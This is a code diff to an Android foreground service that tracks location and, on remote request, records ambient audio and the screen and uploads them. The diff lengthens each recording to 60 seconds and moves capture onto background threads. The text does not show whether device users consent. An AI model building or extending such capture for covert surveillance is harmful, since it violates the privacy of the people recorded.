@@ -79,8 +79,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final long NORMAL_LOOP_MS = 30_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
-    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 2_200L;
-    private static final int REMOTE_AUDIO_SEGMENT_MS = 1_200;
+    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
+    private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
 
     private LocationManager locationManager;
@@ -92,6 +92,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private volatile MediaRecorder screenRecorder = null;
     private volatile File screenRecorderFile = null;
     private volatile String activeScreenSessionId = null;
+    private volatile boolean remoteScreenSegmentRunning = false;
+    private volatile boolean remoteAudioSegmentRunning = false;
     private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
 
     @Override
@@ -385,14 +387,38 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
         if ("ambient_audio".equals(requestType)) {
             activeScreenSessionId = null;
-            captureAndUploadAmbientAudio(sessionId);
+            maybeStartRemoteAudioSegment(sessionId);
             return;
         }
 
         if ("screen".equals(requestType)) {
             activeScreenSessionId = sessionId;
-            captureAndUploadScreenFrame(sessionId);
+            maybeStartRemoteScreenSegment(sessionId);
         }
+    }
+
+    private void maybeStartRemoteScreenSegment(String sessionId) {
+        if (remoteScreenSegmentRunning) return;
+        remoteScreenSegmentRunning = true;
+        new Thread(() -> {
+            try {
+                captureAndUploadScreenFrame(sessionId);
+            } finally {
+                remoteScreenSegmentRunning = false;
+            }
+        }, "remote-screen-segment").start();
+    }
+
+    private void maybeStartRemoteAudioSegment(String sessionId) {
+        if (remoteAudioSegmentRunning) return;
+        remoteAudioSegmentRunning = true;
+        new Thread(() -> {
+            try {
+                captureAndUploadAmbientAudio(sessionId);
+            } finally {
+                remoteAudioSegmentRunning = false;
+            }
+        }, "remote-audio-segment").start();
     }
 
     private void maybeUploadAllMedia() {
@@ -426,8 +452,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             screenRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
             screenRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             screenRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-            screenRecorder.setVideoEncodingBitRate(2_000_000);
-            screenRecorder.setVideoFrameRate(12);
+            screenRecorder.setVideoEncodingBitRate(1_000_000);
+            screenRecorder.setVideoFrameRate(8);
             screenRecorder.setVideoSize(width, height);
             screenRecorder.setOutputFile(screenRecorderFile.getAbsolutePath());
             screenRecorder.prepare();
@@ -442,7 +468,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     null
             );
             screenRecorder.start();
-            Thread.sleep(REMOTE_SCREEN_FRAME_INTERVAL_MS - 400L);
+            Thread.sleep(Math.max(5_000L, REMOTE_SCREEN_FRAME_INTERVAL_MS - 500L));
             screenRecorder.stop();
             screenRecorder.reset();
             screenRecorder.release();
@@ -550,7 +576,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             form.put("captureKind", "screen");
             form.put("supportSessionId", sessionId);
             form.put("segmentStartedAtMs", String.valueOf(startedAt));
-            form.put("segmentDurationMs", "1");
+            form.put("segmentDurationMs", String.valueOf(REMOTE_SCREEN_FRAME_INTERVAL_MS));
             JSONObject metadata = new JSONObject();
             metadata.put("source", "MediaProjection");
             metadata.put("transport", "jpeg_fallback");
